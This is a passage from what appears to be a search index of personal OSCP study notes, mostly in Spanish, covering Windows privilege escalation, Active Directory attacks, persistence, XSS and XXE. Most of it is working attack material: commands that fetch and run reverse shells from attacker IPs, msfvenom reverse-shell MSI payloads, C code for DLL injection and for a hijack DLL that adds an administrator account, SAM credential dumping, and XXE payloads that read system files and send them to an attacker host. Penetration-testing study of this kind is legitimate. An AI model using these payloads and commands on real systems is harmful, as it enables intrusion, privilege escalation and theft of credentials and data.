maquina: <code>shutdown /r /t 0</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#abusar-de-binario-de-un-servicio-con-un-directorio-con-espacios-y-sin-comillas","title":"Abusar de binario de un servicio con un directorio con espacios y sin comillas","text":"<ul> <li>Muchas veces los servicios tienen un directorio con espacios y no tienen comillas, lo que nos permite abusar de esto.</li> <li>Por ejemplo, si tenemos un servicio que tiene un directorio con espacios y no tiene comillas, podemos abusar de esto cambiando el path del servicio.</li> </ul> <p><pre><code>  Name             : DevService\n  DisplayName      : DevService\n  Description      : \n  State            : Stopped\n  StartMode        : Auto\n  PathName         : C:\\Skylark\\Development Binaries 01\\???????.exe\n</code></pre> - En este caso podemos cambiar el path del servicio a un binario que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell. - <code>curl http://192.168.45.210/rev.exe -o Development.exe</code> - <code>sc query DevService</code> - <code>sc Start DevService</code> - <code>sc config DevService binPath= \"C:\\Skylark\\Development Binaries 01\\rev.exe\"</code>: OPCIONAL! a veces no es necesario. - Y del otro lado tenemos el listener escuchando</p>"},{"location":"OSCP/winPrivEsc/#dll-injection","title":"DLL injection","text":"<ul> <li>La idea es metemr un trozo de c\u00f3digo dentro de un DLL que se carga en un proceso activo.</li> <li>Esta tecnica permite ejecutar c\u00f3digo en el contexto de un proceso.</li> </ul>"},{"location":"OSCP/winPrivEsc/#loadlibrary","title":"LoadLibrary","text":"<ul> <li><code>LoadLibrary</code> es una funci\u00f3n de la API de Windows que carga una DLL en la memoria de un proceso.</li> <li>C\u00f3digo C:</li> </ul> <pre><code>#include &lt;windows.h&gt; // windows API\n#include &lt;stdio.h&gt; // standard I/O\n\nint main() {\n    // Using LoadLibrary to load a DLL into the current process\n    HMODULE hModule = LoadLibrary(\"example.dll\");\n    if (hModule == NULL) {\n        printf(\"Failed to load example.dll\\n\");\n        return -1;\n    }\n    printf(\"Successfully loaded example.dll\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"OSCP/winPrivEsc/#ejemplo-de-dll-injection","title":"Ejemplo de DLL injection","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() {\n    // Using LoadLibrary for DLL injection\n    // First, we need to get a handle to the target process\n    DWORD targetProcessId = 123456 // The ID of the target process\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);\n    if (hProcess == NULL) {\n        printf(\"Failed to open target process\\n\");\n        return -1;\n    }\n\n    // Next, we need to allocate memory in the target process for the DLL path\n    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n    if (dllPathAddressInRemoteMemory == NULL) {\n        printf(\"Failed to allocate memory in target process\\n\");\n        return -1;\n    }\n\n    // Write the DLL path to the allocated memory in the target process\n    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);\n    if (!succeededWriting) {\n        printf(\"Failed to write DLL path to target process\\n\");\n        return -1;\n    }\n\n    // Get the address of LoadLibrary in kernel32.dll\n    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n    if (loadLibraryAddress == NULL) {\n        printf(\"Failed to get address of LoadLibraryA\\n\");\n        return -1;\n    }\n\n    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path\n    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);\n    if (hThread == NULL) {\n        printf(\"Failed to create remote thread in target process\\n\");\n        return -1;\n    }\n\n    printf(\"Successfully injected example.dll into target process\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"OSCP/winPrivEsc/#dll-hijacking","title":"DLL Hijacking","text":"<ul> <li>El concepto es reemplazar un DLL utilizado por un programa por otro DLL que contenga c\u00f3digo malicioso para elevar privilegios.</li> <li>Hipoteticamente sabemos que el programa carga un DLL que no existe en el sistema, entonces podemos crear un DLL con el mismo nombre y cargarlo en la memoria del proceso.</li> <li>O tambi\u00e9n hipoteticamente sabemos que el programa carga un DLL que existe en el sistema, pero lo reemplazamos por otro DLL que contenga c\u00f3digo malicioso.</li> </ul>"},{"location":"OSCP/winPrivEsc/#ejemplo-de-dll-hijacking","title":"Ejemplo de DLL Hijacking","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\n// Super inyecci\u00f3n mega b\u00e1sica del curso OSCP\n// Este c\u00f3digo implementa una DLL que realiza una inyecci\u00f3n b\u00e1sica al ser cargada en un proceso.\n// La funci\u00f3n DllMain es el punto de entrada de la DLL y ejecuta diferentes acciones dependiendo del motivo de la llamada.\n// Para compilar en Kali Linux utilizamos mingw64 con el siguiente comando:\n// x86_64-w64-mingw32-gcc SuperBasicInjection.cpp --shared -o SomeMissingDLL.dll\n// Para compilar desde Visual Studio, simplemente cree un proyecto de DLL y agregue este archivo fuente.\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        // Este caso se ejecuta cuando la DLL es cargada en un proceso.\n        // Aqu\u00ed se realiza la inyecci\u00f3n de c\u00f3digo.\n        // En este ejemplo, se crea un usuario local con privilegios de administrador.\n        int i;\n        i = system(\"net user /add test-account test1234\"); // Crea un usuario llamado \"test-account\" con contrase\u00f1a \"test1234\".\n        i = system(\"net localgroup administrators test-account /add\"); // Agrega el usuario al grupo de administradores locales.\n        break;\n    case DLL_THREAD_ATTACH:\n        // Este caso se ejecuta cuando un nuevo hilo se crea en el proceso que carg\u00f3 la DLL.\n        break;\n    case DLL_THREAD_DETACH:\n        // Este caso se ejecuta cuando un hilo que usaba la DLL termina.\n        break;\n    case DLL_PROCESS_DETACH:\n        // Este caso se ejecuta cuando la DLL es descargada del proceso.\n        break;\n    }\n    return TRUE; // Indica que la DLL se carg\u00f3 correctamente.\n}\n</code></pre>"},{"location":"OSCP/winPrivEsc/#runas-save-creds","title":"runas save creds","text":"<ul> <li>Detecci\u00f3n: <code>cmdkey /list</code></li> </ul> <pre><code>C:\\Users\\security\\Desktop&gt;cmdkey /list\n\nCurrently stored credentials:\n\n    Target: Domain:interactive=ACCESS\\Administrator\n                                                       Type: Domain Password\n    User: ACCESS\\Administrator\n\n\nC:\\Users\\security\\Desktop&gt;\n</code></pre> <ul> <li>Explotaci\u00f3n: <code>runas /user:ACCESS\\Administrator /savecred \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.58/rev.ps1')\"</code><ul> <li>Tambi\u00e9n podemos hacer: `runas </li> <li>Ejecutar un archivo ejecutable: <code>runas /user:ACCESS\\Administrator /savecred \"C:\\path\\to\\executable.exe\"</code></li> <li>Abrir el s\u00edmbolo del sistema como administrador: <code>runas /user:ACCESS\\Administrator /savecred \"cmd.exe\"</code></li> <li>Ejecutar un script de PowerShell: <code>runas /user:ACCESS\\Administrator /savecred \"powershell.exe -File C:\\path\\to\\script.ps1\"</code></li> <li>Abrir el Administrador de tareas como administrador: <code>runas /user:ACCESS\\Administrator /savecred \"taskmgr.exe\"</code></li> <li>Ejecutar un programa con argumentos espec\u00edficos: <code>runas /user:ACCESS\\Administrator /savecred \"notepad.exe C:\\path\\to\\file.txt\"</code></li> <li>Abrir el Editor del Registro: <code>runas /user:ACCESS\\Administrator /savecred \"regedit.exe\"</code></li> <li>Ejecutar un navegador web: <code>runas /user:ACCESS\\Administrator /savecred \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"</code></li> <li>Ejecutar un comando en PowerShell interactivo: <code>runas /user:ACCESS\\Administrator /savecred \"powershell.exe -Command Get-Process\"</code></li> <li>Abrir el Explorador de Windows como administrador: <code>runas /user:ACCESS\\Administrator /savecred \"explorer.exe\"</code></li> <li>Ejecutar un script remoto: <code>runas /user:ACCESS\\Administrator /savecred \"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\"</code></li> </ul> </li> </ul>"},{"location":"OSCP/winPrivEsc/#seloaddriverprivilege","title":"SeLoadDriverPrivilege","text":"<ul> <li>Este privilegio permite la habilidad de cargar drivers en el sistema.</li> <li>Si aparece en <code>whoami /priv</code> como <code>Disabled</code> podemos utilizar este .exe para re-habilitarlo</li> </ul>"},{"location":"OSCP/winPrivEsc/#credential-harvesting","title":"Credential harvesting","text":"<ul> <li><code>Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.json,*.log | Select-String -Pattern 'password|user|login|credential'</code></li> <li><code>Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</code></li> <li><code>Get-History</code>: Muestra el historial de comandos ejecutados en la sesi\u00f3n actual de PowerShell.</li> <li><code>(Get-PSReadlineOption).HistorySavePath</code>: Muestra la ruta del archivo donde se guarda el historial de comandos de PowerShell.</li> </ul>"},{"location":"OSCP/winPrivEsc/#semanagevolumeprivilege","title":"SeManageVolumePrivilege","text":"<ul> <li>Este privilegio permite la habilidad de crear y eliminar vol\u00famenes en el sistema.</li> <li>Podemos utilizar el siguiente exploit para elevar privilegios.</li> </ul>"},{"location":"OSCP/winPrivEsc/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<ul> <li>Este privilegio permite la habilidad de instalar software sin necesidad de permisos de administrador.</li> <li>Armamos un payload <code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.210 LPORT=135 -f msi &gt; payload.msi</code><ul> <li>Alternativa: <code>msfvenom -p cmd/windows/adduser USER=backdoor PASS=P@ssw0rd123 -f msi &gt; payload.msi</code></li> <li>Luego nos podemos conectar con winrm o usar runas</li> </ul> </li> </ul>"},{"location":"OSCP/winPrivEsc/#gpoabuse","title":"GPOAbuse","text":"<ul> <li>M\u00e1s info</li> <li>Podemos tener un usuario con varios permisos sobre las politicas del dominio. </li> <li>Podemos utilizar SharpGPOAbuse para intentar agregar un usuario al grupo de administradores del dominio.</li> <li><code>.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName \"Default Domain Policy\"</code></li> </ul> <pre><code>*Evil-WinRM* PS C:\\Users\\charlotte\\Documents&gt; .\\.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName \"Default Domain Policy\"\n[+] Domain = secura.yzx\n[+] Domain Controller = dc01.secura.yzx\n[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx\n[+] SID Value of Charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104\n[+] GUID of \"Default Domain Policy\" is: {31B2F340-016D-11D2-945F-00C04FB984F9}\n[+] File exists: \\\\secura.yzx\\SysVol\\secura.yzx\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] The GPO does not specify any group memberships.\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.\n[+] Done!\n</code></pre> <ul> <li><code>gpupdate /force</code></li> <li>Te puedes conectar con evil-winrm o meterpreter. </li> </ul> <pre><code>*Evil-WinRM* PS C:\\Users\\charlotte\\Documents&gt; net localgroup administrators\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\ncharlotte\nThe command completed successfully.\n</code></pre>"},{"location":"OSCP/winPrivEsc/#windowsold-credential-dumping","title":"windows.old credential dumping","text":"<ul> <li>En caso de que la maquina tenga un windows.old, podemos intentar dumpear las credenciales de los usuarios que estaban en el sistema anterior.<ul> <li><code>copy C:\\windows.old\\Windows\\System32\\config\\sam C:\\sam.save</code></li> <li><code>copy C:\\windows.old\\Windows\\System32\\config\\system C:\\system.save</code></li> <li><code>secretsdump.py -sam sam.save -system system.save LOCAL</code></li> </ul> </li> </ul>"},{"location":"OSCP/winad/","title":"Windows Active directory","text":""},{"location":"OSCP/winad/#interactive-cheat-sheet","title":"INTERACTIVE CHEAT SHEET","text":"<p>internal pentesting \"all the things\" notes</p>"},{"location":"OSCP/winad/#tools","title":"Tools","text":""},{"location":"OSCP/winad/#attack-vectors-post-compromise-attacks-too","title":"Attack Vectors &amp; Post Compromise Attacks too","text":"<ul> <li>LLMNR POISONING<ul> <li>This is a quick view</li> <li>Attack tool \"Responder\"</li> </ul> </li> <li>Net-NTLMv2 / SMB Relay Attacks<ul> <li>This guide is a little bit better than the other one</li> </ul> </li> <li>Pass the hash</li> <li>Password attacks &amp; Cracking</li> <li>IPv6 AD Attack (mitm)</li> <li>Passback attacks</li> <li>Attacking LSASS</li> <li>DCsync Attack</li> <li>Group Policy Preferences Passwords</li> <li>Run As Lateral Movement</li> <li>others that i didn't take notes yet</li> </ul>"},{"location":"OSCP/winad/#more-post-compromise-attacks","title":"More Post compromise attacks","text":""},{"location":"OSCP/winad/#quick-notes","title":"Quick notes","text":""},{"location":"OSCP/winad/#initial-internal-pentest-attack-strategy","title":"Initial internal pentest attack strategy","text":"<ol> <li>mitm6 or responder</li> <li>run scans to generate traffic</li> <li>if scans are taking too long, look for websites in scope <code>(http_version)</code></li> <li>Look for default credentials on web logins<ul> <li>Printers</li> <li>Jenkins</li> <li>Etc</li> </ul> </li> <li>enumerate all</li> </ol>"},{"location":"OSCP/winad/#enumerations-commands","title":"Enumerations commands","text":"<ul> <li>ENUMERATION HERE</li> <li><code>net user /domain</code></li> <li><code>net user $USER /domain</code></li> <li><code>net group /domain</code></li> </ul>"},{"location":"OSCP/winad/#post-compromise-ad-enumeration","title":"Post-Compromise AD enumeration","text":"<ul> <li>Bloudhound<ul> <li><code>sudo bloodhound-python -d DOMAIN.local -u $USERNAME -p $PASSWORD -ns $IP -c all</code></li> </ul> </li> <li>Plumhound</li> <li>Ldapdomaindump<ul> <li><code>sudo ldapdomaindump ldaps://$IP -u 'DOMAIN\\username' -p $PASSWORD</code></li> <li>Caso hipotetico de uso: LLMNR =&gt; conseguimos un hash =&gt; lo crackeamos =&gt; probamos la contrase\u00f1a en otras maquinas =&gt; encontramos nuevo login =&gt; secrets dump those logins =&gt; local admin hashes =&gt; re-spray network with local accs</li> </ul> </li> <li>PingCastle</li> <li>etc</li> <li>Trevor Spray tool</li> <li>SeatBelt Tool</li> </ul>"},{"location":"OSCP/winad/#now-we-own-the-domain-whats-next","title":"Now we own the domain what's next?","text":"<ul> <li>Provide as much value to the client as possible<ul> <li>Put your blinders on and do it again</li> <li>Dump the NTDS.dit and crack passwords</li> <li>Enumarate shares for sensitive information</li> </ul> </li> <li>Persistence can be important<ul> <li>What happens if our DA access is lost?</li> <li>Creating a DA account can be useful (remember we have to delete it)</li> <li>creating a golden ticket can be useful too</li> </ul> </li> </ul>"},{"location":"OSCP/winad/#ntdsdit","title":"NTDS.dit","text":"<ul> <li>What is it?<ul> <li>A DB used to store AD data.<ul> <li>User info.</li> <li>Group info.</li> <li>Security descriptors</li> <li>Password hashes</li> </ul> </li> </ul> </li> <li>Golden Ticket attack<ul> <li>When we compromise the krbtgt (kerberos target) account, we own the domain</li> <li>We can request access to any resource or system on the domain</li> <li>Golden tickets = complete access to every machine</li> </ul> </li> </ul>"},{"location":"OSCP/winad/#lateral-movement-notes","title":"Lateral movement notes","text":"<ul> <li>Tools:<ul> <li>Psexec =&gt; internal tool</li> <li>WinRM</li> </ul> </li> </ul>"},{"location":"OSCP/winad/#persistence","title":"Persistence","text":"<ul> <li>Persistence Scripts</li> <li><code>run persistence -h</code></li> <li><code>exploit/windows/local/persistence</code></li> <li> <p><code>exploit/windows/local/registry_persistence</code></p> </li> <li> <p>Scheduled Tasks</p> </li> <li><code>run scheduleme</code></li> <li> <p><code>run schtaskabuse</code></p> </li> <li> <p>Add a user</p> </li> <li><code>net user hacker password123 /add</code></li> </ul>"},{"location":"OSCP/xss/","title":"Cross-Site Scripting XSS","text":"<ul> <li>Son un ataque de tipo inyecci\u00f3n de c\u00f3digo a trav\u00e9s de la web que ejecuta javascript.</li> <li>Basicamente es inyecci\u00f3n de c\u00f3digo javascript en la web.</li> </ul>"},{"location":"OSCP/xss/#tipos-de-xss","title":"Tipos de XSS","text":""},{"location":"OSCP/xss/#reflejado","title":"Reflejado","text":"<ul> <li>Ocurre cuando los datos proporcionados del usuario se reflejan inmediatamente en la respuesta del servidor sin una validaci\u00f3n decente.</li> <li>Un atacante podr\u00eda enviar en unlace malicioso a un usuario y cuando este hace click se ejecuta en el navegador y le puede robar las cookies por ejemplo.</li> <li>Impacto:<ul> <li>Robo de cookies/sesi\u00f3n (account take over).</li> <li>Filtraci\u00f3n de datos sensibles.</li> <li>Redireccionamiento a sitios maliciosos.</li> </ul> </li> </ul>"},{"location":"OSCP/xss/#persistente","title":"Persistente","text":"<ul> <li>En este caso el c\u00f3digo malicioso queda fijo en el servidor y se ejecuta cada vez que un usuario accede a la p\u00e1gina afectada.</li> <li>Un atacante inserta un script malicioso dentro de un comentario.</li> <li>Impacto:<ul> <li>Robo de informaci\u00f3n sensible.</li> <li>Secuestro de sesiones.</li> <li>Modificaci\u00f3n del sitio web.</li> </ul> </li> </ul>"},{"location":"OSCP/xss/#dom-xss","title":"DOM XSS","text":"<ul> <li>Este tipo de XSS ocurre cuando la vulnerabilidad del c\u00f3digo JS se encuentra unicamente del lado del cliente.</li> <li>El atacante podr\u00eda manipular el DOM para ejecutar codigo malicioso.</li> <li>Impacto:<ul> <li>Manipulaci\u00f3n del contenido de la p\u00e1gina del lado del cliente.</li> <li>Ejecuci\u00f3n de acciones no autorizadas por el navegador (se podr\u00eda utilizar BeeF como PoC).</li> <li>Distribuci\u00f3n de malware, kinda botnet, etc.</li> </ul> </li> </ul>"},{"location":"OSCP/xss/#automatizacion","title":"Automatizaci\u00f3n","text":"<ul> <li>XSS STRIKE</li> <li>Payloads + fuzzing</li> </ul>"},{"location":"OSCP/xss/#un-payload-interesante","title":"Un payload interesante","text":"<p> - <code>((_)=&gt;m=&gt;_[m]|| (confirm(m),_[m]=1))({})</code> - este payload est\u00e1 basado en una funci\u00f3n autoejecutable (IIFE) y una t\u00e9cnica de memoizaci\u00f3n (ver programaci\u00f3n dinamica) para evitar ejecuciones repetidas.</p>"},{"location":"OSCP/xss/#el-payload","title":"El Payload","text":"<pre><code>((_)=&gt;m=&gt;_[m]|| (confirm(m), _[m]=1))({})\n</code></pre>"},{"location":"OSCP/xss/#explicacion-paso-a-paso","title":"Explicaci\u00f3n paso a paso","text":""},{"location":"OSCP/xss/#1-funcion-autoejecutable-iife","title":"1. Funci\u00f3n autoejecutable (IIFE)","text":"<p>El c\u00f3digo comienza con una Immediately Invoked Function Expression (IIFE), es decir, una funci\u00f3n que se ejecuta inmediatamente: <pre><code>((_) =&gt; m =&gt; _[m] || (confirm(m), _[m] = 1))({})\n</code></pre> - La funci\u00f3n externa <code>(_) =&gt; ...</code> recibe un objeto <code>{}</code> como argumento. - Este objeto se usa como almacenamiento temporal para guardar valores.</p>"},{"location":"OSCP/xss/#2-funcion-interna-con-m-como-parametro","title":"2. Funci\u00f3n interna con <code>m</code> como par\u00e1metro","text":"<p><pre><code>m =&gt; _[m] || (confirm(m), _[m] = 1)\n</code></pre> - Cuando se llama con un valor <code>m</code>, la funci\u00f3n intenta acceder a <code>_ [m]</code>. - Si <code>_ [m]</code> es <code>undefined</code>, se ejecuta <code>confirm(m)</code> y luego se asigna <code>_ [m] = 1</code>. - Si <code>_ [m]</code> ya existe, la funci\u00f3n simplemente devuelve su valor, evitando que <code>confirm(m)</code> se ejecute nuevamente.</p>"},{"location":"OSCP/xss/#3-uso-del-operador-or-y-la-coma","title":"3. Uso del operador OR (<code>||</code>) y la coma (<code>,</code>)","text":"<p><pre><code>_[m] || (confirm(m), _[m] = 1)\n</code></pre> - <code>||</code> (Operador OR): Si <code>_ [m]</code> es <code>undefined</code>, eval\u00faa la segunda parte <code>(confirm(m), _[m] = 1)</code>. - Operador <code>,</code> (coma): Permite ejecutar <code>confirm(m)</code> antes de asignar <code>_ [m] = 1</code>.</p>"},{"location":"OSCP/xss/#4-ejecucion-del-codigo","title":"4. Ejecuci\u00f3n del c\u00f3digo","text":"<p>El resultado es que <code>confirm(m)</code> solo se ejecutar\u00e1 la primera vez que se pase un valor <code>m</code>. Para valores repetidos, el c\u00f3digo devolver\u00e1 <code>_ [m]</code> sin ejecutar <code>confirm(m)</code> nuevamente.</p>"},{"location":"OSCP/xss/#uso-en-ataques-xss","title":"Uso en ataques XSS","text":"<p>Este payload puede inyectarse en sitios vulnerables para ejecutar c\u00f3digo arbitrario en el navegador de la v\u00edctima.</p> <p>Ejemplo de inyecci\u00f3n XSS: <pre><code>&lt;input onfocus=\"((_)=&gt;m=&gt;_[m]|| (confirm(m), _[m]=1))({})('XSS')\" autofocus&gt;\n</code></pre> - Cuando el usuario hace foco en el <code>input</code>, se ejecuta <code>confirm('XSS')</code>.</p>"},{"location":"OSCP/xxe/","title":"XXE (XML External Entity)","text":"<ul> <li>XXE es una vulnerabilidad de seguridad que se produce cuando una aplicaci\u00f3n web expone un punto de entrada que permite la inclusi\u00f3n de archivos XML externas.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda incluir archivos XML maliciosos en una solicitud POST o GET.</li> </ul>"},{"location":"OSCP/xxe/#identificando-xxe","title":"Identificando XXE","text":"<ul> <li>Para identificar XXE, se pueden seguir los siguientes pasos:<ul> <li>Identificar puntos de entrada que permiten la inclusi\u00f3n de archivos XML externas.</li> <li>Verificar si la aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas.</li> <li>Verificar si la aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas en las solicitudes POST o GET.</li> </ul> </li> </ul>"},{"location":"OSCP/xxe/#payloads-con-system","title":"Payloads con SYSTEM","text":"<ul> <li>Para explotar XXE, se pueden utilizar diferentes payloads con SYSTEM.</li> <li>Un payload con SYSTEM es un payload que contiene una directiva de sistema que se ejecutar\u00e1 en el servidor.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar un payload con SYSTEM para ejecutar c\u00f3digo en el servidor.</li> <li>Payloads:<ul> <li><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li> <li><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li> </ul> </li> </ul>"},{"location":"OSCP/xxe/#payloads-con-dtd","title":"Payloads con DTD","text":"<ul> <li>Para explotar XXE, se pueden utilizar diferentes payloads con DTD.</li> <li>Un payload con DTD es un payload que contiene una declaraci\u00f3n de tipo de documento (DTD) que se utilizar\u00e1 para validar el documento XML.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar un payload con DTD para ejecutar c\u00f3digo en el servidor.</li> <li>Payloads:<ul> <li><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li> <li><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li> </ul> </li> </ul>"},{"location":"OSCP/xxe/#identificando-xxe_1","title":"Identificando XXE","text":"<ul> <li>Primero tenemos que encontrar una petici\u00f3n que permita la inclusi\u00f3n de archivos XML externas.</li> <li>Puede ser desde un formulario, una solicitud HTTP, un archivo de configuraci\u00f3n, un excel, etc.</li> <li>Payloads list</li> </ul>"},{"location":"OSCP/xxe/#rce-con-xxe","title":"RCE con XXE","text":"<ul> <li>Podemos utilizar el siguiente payload para ejecutar comandos en el servidor:<ul> <li><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"expect://ls\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li> <li><code>&lt;!ENTITY company SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/shell.php'\"&gt;</code></li> <li><code>&lt;!ENTITY % file SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/shell.php'\"&gt;%file;</code></li> </ul> </li> </ul>"},{"location":"OSCP/xxe/#filtracion-con-cdata","title":"Filtraci\u00f3n con CDATA","text":"<ul> <li>Para filtrar el contenido de una aplicaci\u00f3n web, se puede utilizar la directiva CDATA.</li> <li>La directiva CDATA se utiliza para filtrar el contenido de una aplicaci\u00f3n web.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar la directiva CDATA para filtrar el contenido de la aplicaci\u00f3n web.</li> <li>Payloads: <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY begin \"&lt;![CDATA[\"&gt;\n  &lt;!ENTITY file SYSTEM \"file:///var/www/html/submitDetails.php\"&gt;\n  &lt;!ENTITY end \"]]&gt;\"&gt;\n  &lt;!ENTITY joined \"&amp;begin;&amp;file;&amp;end;\"&gt;\n]&gt;\n</code></pre></li> </ul>"},{"location":"OSCP/xxe/#parametros-en-declaraciones-de-entidades","title":"Parametros en declaraciones de entidades","text":"<ul> <li>Las declaraciones de entidades pueden contener par\u00e1metros que se utilizan para reemplazar valores din\u00e1micos en la declaraci\u00f3n de entidad.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar par\u00e1metros para reemplazar el contenido de la aplicaci\u00f3n web.</li> <li>utilizamos <code>%</code> para poner par\u00e1metros en declaraciones de entidades. <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY % begin \"&lt;![CDATA[\"&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;\n  &lt;!ENTITY % file SYSTEM \"file:///var/www/html/SOME-FILE.php\"&gt; &lt;!-- reference external file --&gt;\n  &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!-- append the end of the CDATA tag --&gt;\n  &lt;!ENTITY % xxe SYSTEM \"http://OUR_IP:PORT/xxe.dtd\"&gt; &lt;!-- reference our external DTD --&gt;\n  %xxe;\n]&gt;\n...\n&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;\n</code></pre></li> <li>Desde la maquina atacante tenemos que xxe: <code>&lt;!ENTITY joined \"%begin;%file;%end;\"&gt;</code></li> </ul>"},{"location":"OSCP/xxe/#error-based-xxe","title":"Error based XXE","text":"<ul> <li>Error based XXE es un ataque que se basa en la identificaci\u00f3n de errores en la aplicaci\u00f3n web.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar un payload con DTD para ejecutar c\u00f3digo en el servidor.</li> <li>Primero tenemos que ver de generar un error xml en la aplicaci\u00f3n web.</li> <li>Luego podemos tener un DTD as\u00ed: <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/hosts\"&gt;\n&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;\n</code></pre> Y podemos tener el siguiente payload en la petici\u00f3n <pre><code>&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %error;\n]&gt;\n</code></pre></li> </ul>"},{"location":"OSCP/xxe/#out-of-band-xxe-blind-xxe","title":"Out of Band XXE (blind XXE)","text":"<ul> <li>Es como una inyecci\u00f3n ciega de SQLi, pero en este caso se utiliza un payload de tipo DTD para ejecutar c\u00f3digo en el servidor.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite la inclusi\u00f3n de archivos XML externas, un atacante podr\u00eda utilizar un payload de tipo DTD para ejecutar c\u00f3digo en el servidor.</li> <li>Pero no vamos a ver ning\u00fan output en la aplicaci\u00f3n web.</li> <li>Podemos tener el siguiente payload: <pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;\"&gt;\n</code></pre> y la petici\u00f3n: <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %oob;\n]&gt;\n&lt;root&gt;&amp;content;&lt;/root&gt;\n</code></pre></li> 